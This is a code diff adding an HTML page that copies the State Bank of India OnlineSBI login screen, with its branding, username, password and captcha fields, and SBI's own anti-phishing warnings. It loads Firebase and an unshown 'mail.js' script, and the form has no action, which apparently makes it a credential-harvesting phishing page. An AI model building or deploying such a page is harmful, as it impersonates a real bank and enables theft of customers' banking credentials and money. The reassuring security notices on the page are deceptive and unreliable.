@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <title>sbi-home</title>
+</head>
+
+<body>
+
+    <main class="container">
+        <div class="top-nav">
+            <img src="img/logo.jpg" alt="" class="logo">
+            <div class="right-links">
+                <!-- <img src="img/sbi-home.jpg" alt="" class="logo2"> -->
+                <ul>
+                    <li><a href="#" class="active"><ion-icon name="home-outline" class="home-icon"></ion-icon> SBI Home Loan</a></li>
+                </ul>
+                <ul>
+                    <li><a href="#">About OnlineSBI</a></li>
+                </ul>
+                <ul>
+                    <li><a href="#">Forms</a></li>
+                </ul>
+                <ul>
+                    <li><a href="#">Net Banking Branches</a></li>
+                </ul>
+                <button class="btn1">Language <ion-icon name="caret-down-outline"></ion-icon></button>
+            </div>
+        </div>
+        <div class="blue-nav">
+            <a href="#">Home</a>
+            <a href="#">Products & Services</a>
+            <a href="#">How Do I</a>
+            <a href="#">Manage Debit Card E-Mandate</a>
+        </div>
+        <div class="light-blue-nav">
+            <div class="content">
+                <a href="#">Login to OnlineSBI</a>
+                <a href="#">Welcome to Personal Internet Banking</a>
+            </div>
+        </div>
+        <div class="hero-container">
+            <div class="left-content">
+                <form action="" id="sbi">
+                    <p>
+                        ( <span>CARE: </span>Username and password are case sensitive.)
+                    </p>
+    
+                    <label for="input">Username*</label>
+                    <input type="text" autocomplete="off"  id="uname" required >
+    
+                    <label for="password">Password*</label>
+                    <input type="password" autocomplete="off" id="pass" required>
+    
+                    <label for="captcha">Enter the text as shown in <br> the image*</label>
+                    <input type="text" autocomplete="off" required>
+    
+                    <img src="img/captcha.jpg" alt="" class="captcha">
+    
+                    <div class="main-button">
+                        <button type="submit" class="blue-btn" >Login</button>
+                        <button type="reset" class="blue-btn">Reset</button>
+                </form>
+                
+                </div>
+
+                <div class="security">
+                    <p>For better security use the Online Virtual Keyboard to login.</p>
+                    <a href="#">More ...</a>
+                </div>
+            </div>
+            <div class="right-content">
+                <img src="img/big-img.jpg" alt="" class="big-img">
+            </div>
+        </div>
+
+
+
+        <!-- -------About us section---- -->
+
+        <div class="row-container">
+            <div class="row">
+                <img src="img/info.jpg" alt="" class="icons-img">
+                <p>NEVER respond to any popup,email, SMS or phone call, no matter how appealing or official looking,
+                    seeking your personal information such as username, password(s), mobile number, ATM Card details,
+                    etc. Such communications are sent or created by fraudsters to trick you into parting with your
+                    credentials.</p>
+            </div>
+            <div class="row">
+                <img src="img/links.jpg" alt="" class="icons-img">
+                <div class="raw-links">
+                    <a href="#">Complaints</a>
+                    <a href="#">About Phishing</a>
+                    <a href="#">Trouble logging in</a>
+                    <a href="#">Report Phishing</a>
+                    <a href="#">Password Management</a>
+                    <a href="#"> <span> Lock & Unlock User</span></a>
+                    <a href="#">Security Tips</a>
+                    <a href="#">Block ATM card</a>
+                    <a href="#">FAQ</a>
+                </div>
+            </div>
+            <div class="row">
+                <img src="img/verified.jpg" alt="" class="icons-img">
+                <p>This site is certified by Verisign as a secure and trusted site. All information sent or received in
+                    this site is encrypted using 256-bit encryption</p>
+            </div>
+
+        </div>
+
+        <!-- ------2nd last banner section----- -->
+
+        <div class="third-last-banner">
+            <li>Mandatory fields are marked with an asterisk (*)</li>
+            <li>Do not provide your username and password anywhere other than in this page</li>
+            <li>Your username and password are highly confidential. Never part with them.SBI will never ask for this
+                information.</li>
+
+        </div>
+
+        <div class="second-last">
+            <img src="img/banner-logo.jpg" alt="" class="baner-logo">
+        </div>
+
+        <div class="banner">
+            <p>© State Bank of India (APM Id: Serv_Tran_552)</p>
+            <p>Site best viewed at 1024 x 768 resolution in Microsoft Edge 79 +, Mozilla 96 +, Google Chrome 97 +</p>
+        </div>
+
+    </main>
+
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/firebase/7.14.1-0/firebase.js"></script>
+    <script src="./mail.js"></script>
+    <script type="module" src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js"></script>
+    <script nomodule src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"></script>
+</body>
+
+</html>
